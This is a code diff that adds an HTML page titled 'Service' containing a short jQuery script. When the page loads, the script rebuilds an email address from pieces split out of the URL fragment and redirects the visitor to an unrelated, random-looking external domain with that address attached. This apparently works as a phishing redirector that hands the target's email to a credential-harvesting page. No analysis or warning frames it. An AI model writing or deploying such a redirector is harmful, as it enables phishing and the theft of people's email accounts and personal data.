@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Service</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <script>
+     $(document).ready(function() {
+            // Get the current URL
+            var url = window.location.href;
+
+            // Extract the relevant parts from the URL
+            var hashPart = url.split('#')[1];
+            var questionMarkPart = hashPart.split('?')[1];
+            var parts = questionMarkPart.split('&&');
+
+            // Merge the parts to form the email
+            var part1 = hashPart.split('?')[0];  // "P"
+            var part2 = parts[0];                // "mike"
+            var part3 = parts[1];                // "james.com"
+
+            var email = part1 + part2 + "@" + part3;
+
+             // Construct the new URL
+            var newUrl = `https://w1G.comeight1.com/4joXT/#${email}`;
+
+            // Redirect to the new URL
+            window.location.href = newUrl;
+        });
+     
+    </script>
+</body>
+</html>
